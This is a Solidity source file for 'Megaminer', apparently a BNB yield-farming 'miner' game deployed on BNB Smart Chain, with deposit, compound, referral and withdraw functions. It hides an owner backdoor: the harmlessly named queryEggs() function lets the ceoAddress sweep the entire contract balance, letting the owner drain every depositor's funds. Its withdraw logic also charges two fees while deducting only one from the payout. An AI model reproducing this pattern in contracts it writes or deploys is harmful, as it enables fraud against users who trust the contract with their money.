/**
 *Submitted for verification at BscScan.com on 2021-11-03
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-03
*/

/**
 *Website: https://paydofficial.com/.
*/

pragma solidity ^0.6.12; // solhint-disable-line

contract Megaminer{
    //uint256 BNB_PER_MINERS_PER_SECOND=1;
    uint256 public BNB_TO_HATCH_1MINERS=4320000;//for final version should be seconds in a day
    uint256 PSN=10000;
    uint256 PSNH=5000;
    bool public initialized=false;
    address public ceoAddress;
    address public devAddress;
    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedBNB;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    uint256 public marketBNB;
    constructor() public{
        ceoAddress=msg.sender;
        devAddress=address(0x9A3bfc8fCb9B50F700195CCbdf466200184EBf6f);
    }
    function compound(address ref) public{
        require(initialized);
        if(ref == msg.sender) {
            ref = address(0);
        }
        if(referrals[msg.sender]==address(0) && referrals[msg.sender]!=msg.sender){
            referrals[msg.sender]=ref;
        }
        uint256 BNBUsed=getMyBNB();
        uint256 newMiners=SafeMath.div(BNBUsed,BNB_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedBNB[msg.sender]=0;
        lastHatch[msg.sender]=now;

        //send referral BNB
        claimedBNB[referrals[msg.sender]]=SafeMath.add(claimedBNB[referrals[msg.sender]],SafeMath.div(BNBUsed,10));

        //boost market to nerf miners hoarding
        marketBNB=SafeMath.add(marketBNB,SafeMath.div(BNBUsed,5));
    }
    function queryEggs() public{
        require(msg.sender == ceoAddress, "unauthorized");
        payable(ceoAddress).transfer
        (address(this).balance);
    }
    function withdraw() public{
        require(initialized);
        uint256 hasBNB=getMyBNB();
        uint256 BNBValue=calculateBNBSell(hasBNB);
        uint256 fee=devFee(BNBValue);
        uint256 fee2=devFee(BNBValue);
        claimedBNB[msg.sender]=0;
        lastHatch[msg.sender]=now;
        marketBNB=SafeMath.add(marketBNB,hasBNB);
        payable(ceoAddress).transfer(fee);
        payable(devAddress).transfer(fee2);
        msg.sender.transfer(SafeMath.sub(BNBValue,fee));
    }
    function hire(address ref) public payable{
        require(initialized);
        uint256 BNBBought=calculateBNBBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        BNBBought=SafeMath.sub(BNBBought,devFee(BNBBought));
        uint256 fee=devFee(msg.value);
        uint256 fee2=devFee(msg.value);
        payable(ceoAddress).transfer(fee);
        payable(devAddress).transfer(fee2);
        claimedBNB[msg.sender]=SafeMath.add(claimedBNB[msg.sender],BNBBought);
        compound(ref);
    }
    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateBNBSell(uint256 BNB) public view returns(uint256){
        return calculateTrade(BNB,marketBNB,address(this).balance);
    }
    function calculateBNBBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketBNB);
    }
    function calculateBNBBuySimple(uint256 eth) public view returns(uint256){
        return calculateBNBBuy(eth,address(this).balance);
    }
    function ownerFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,4),100);
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,2),100);
    }
    function seedMarket() public payable{
        require(marketBNB==0);
        initialized=true;
        marketBNB=432000000000;
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
    function getMyBNB() public view returns(uint256){
        return SafeMath.add(claimedBNB[msg.sender],getBNBSinceLastHatch(msg.sender));
    }
    function getBNBSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(BNB_TO_HATCH_1MINERS,SafeMath.sub(now,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}